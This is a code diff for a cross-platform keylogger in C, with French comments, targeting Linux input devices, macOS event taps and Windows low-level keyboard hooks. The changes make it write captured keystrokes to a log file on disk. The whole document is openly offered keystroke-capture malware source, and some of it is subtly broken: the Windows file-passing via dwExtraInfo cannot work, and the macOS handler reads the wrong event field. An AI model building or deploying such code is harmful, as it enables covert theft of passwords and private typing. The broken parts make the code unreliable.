@@ -1,16 +1,27 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
 #ifdef __linux__
 
 #include <fcntl.h>
 #include <unistd.h>
 #include <linux/input.h>
-#include <stdio.h>
 #include <dirent.h>
 
-void keylogger() {
+// Fonction pour enregistrer les événements de touches sur Linux
+void keylogger(const char *file_path) {
     struct dirent *entry;
     DIR *dir = opendir("/dev/input");
     if (!dir) {
         perror("Failed to open /dev/input");
+        return;
+    }
+
+    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
+    if (!logfile) {
+        perror("Failed to open log file");
+        closedir(dir);
         return;
     }
 
@@ -32,13 +43,14 @@ void keylogger() {
                     break;
                 }
                 if (ev.type == EV_KEY && ev.value == 1) { // Key press event
-                    printf("Key pressed: %d from %s\n", ev.code, device_path);
+                    fprintf(logfile, "Key pressed: %d from %s\n", ev.code, device_path);
                 }
             }
             close(fd);
         }
     }
 
+    fclose(logfile); // Ferme le fichier à la fin
     closedir(dir);
 }
 
@@ -47,18 +59,28 @@ void keylogger() {
 #ifdef __APPLE__
 #include <ApplicationServices/ApplicationServices.h>
 
+// Gestionnaire d'événements pour macOS
 CGEventRef event_handler(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *userInfo) {
     if (type == kCGEventKeyDown) {
         int keyCode = CGEventGetIntegerValueField(event, kCGEventSourceStateID);
-        printf("Key pressed: %d\n", keyCode);
+        FILE *logfile = (FILE *)userInfo; // Récupère le fichier passé en argument
+        fprintf(logfile, "Key pressed: %d\n", keyCode); // Enregistre la touche dans le fichier
     }
     return event;
 }
 
-void start_keylogger() {
-    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, NULL);
+// Fonction pour démarrer le keylogger sur macOS
+void start_keylogger(const char *file_path) {
+    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
+    if (!logfile) {
+        printf("Failed to open log file\n");
+        return;
+    }
+
+    CFMachPortRef eventTap = CGEventTapCreate(kCGEventTapEventTap, kCGEventTapOptionDefault, kCGEventTapEventTap, kCGEventKeyDown, event_handler, logfile);
     if (!eventTap) {
         printf("Failed to create event tap\n");
+        fclose(logfile);
         return;
     }
 
@@ -66,37 +88,57 @@ void start_keylogger() {
     CFRunLoopAddSource(runLoop, CFMachPortCreateRunLoopSource(NULL, eventTap, 0), kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
     CFRunLoopRun();
+
+    fclose(logfile); // Ferme le fichier une fois le keylogger terminé
 }
+
 #endif
 
 #ifdef __WIN32__
 
-
 #include <windows.h>
 #include <stdio.h>
 
+// Callback pour le hook clavier sous Windows
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
         KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
         if (wParam == WM_KEYDOWN) {
-            printf("Key pressed: %d\n", kbd->vkCode);
+            FILE *logfile = (FILE *)kbd->dwExtraInfo; // Récupère le fichier passé en argument
+            fprintf(logfile, "Key pressed: %d\n", kbd->vkCode); // Enregistre la touche dans le fichier
         }
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-void start_keylogger() {
+// Fonction pour démarrer le keylogger sous Windows
+void start_keylogger(const char *file_path) {
+    FILE *logfile = fopen(file_path, "a"); // Ouvre le fichier pour ajouter des logs
+    if (!logfile) {
+        printf("Failed to open log file\n");
+        return;
+    }
+
     HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (hook == NULL) {
         printf("Failed to install hook\n");
+        fclose(logfile);
         return;
     }
+
+    // Passer le fichier en argument en utilisant dwExtraInfo
+    SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
+    KBDLLHOOKSTRUCT kbdInfo;
+    kbdInfo.dwExtraInfo = (ULONG_PTR)logfile;
+
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
+
     UnhookWindowsHookEx(hook);
+    fclose(logfile); // Ferme le fichier après l'exécution du keylogger
 }
 
 #endif
